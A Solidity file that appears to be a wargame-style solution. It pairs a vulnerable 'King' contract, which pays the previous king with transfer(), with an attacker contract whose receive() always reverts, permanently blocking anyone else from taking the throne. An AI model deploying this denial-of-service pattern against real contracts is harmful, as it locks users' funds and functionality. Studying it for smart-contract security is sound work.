// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract ForeverKing {

    King kingContract;

    constructor(address _kingContract) {
        kingContract = King(payable(_kingContract));
    }

    function becomeKing() external payable {
        require(msg.value >= kingContract.prize(), "Need to send more ETH to become the king");
        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    receive() external payable {
        revert('i am the king forever!');
    }
}